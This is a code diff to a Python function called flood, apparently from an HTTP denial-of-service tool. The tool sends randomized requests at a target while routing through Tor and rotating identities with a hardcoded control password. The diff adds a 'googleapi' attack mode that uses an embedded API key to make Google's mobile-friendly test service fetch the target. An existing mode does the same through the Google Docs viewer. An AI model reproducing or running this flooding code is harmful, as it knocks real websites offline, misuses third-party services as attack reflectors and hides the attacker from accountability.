@@ -29,13 +29,18 @@ def flood(target,domainname,attack,sock):
     "Accept-Encoding": "gzip, deflate, br",
     "User-agent": random.choice(user_agents),"host":domainname,
     }
+    payload = str(random._urandom(random.randint(10, 150)))
+    datapost= {
+    "url": target+'?'+payload,
+    "requestScreenshot": false,
+    }
     s = requests.Session()
 	
     with Controller.from_port(port = 9051) as controller:
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
 	
-    payload = str(random._urandom(random.randint(10, 150)))
+    
     #payload = randomurl()
     if sock =='http':
         proxies = {'http': "socks5://127.0.0.1:9050"}
@@ -50,8 +55,8 @@ def flood(target,domainname,attack,sock):
                 r = s.get(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-            elif attack =='put':
-                r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            elif attack =='googleapi':
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key=AIzaSyBHi888UMDA55dSnonFKSNZtgm-8_6TQ7I', data=datapost, headers=headers, timeout=20 ,verify=False)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
@@ -63,8 +68,8 @@ def flood(target,domainname,attack,sock):
                 r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
-            elif attack =='put':
-                r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='googleapi':
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key=AIzaSyBHi888UMDA55dSnonFKSNZtgm-8_6TQ7I', data=datapost, headers=headers, timeout=20 ,verify=False)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
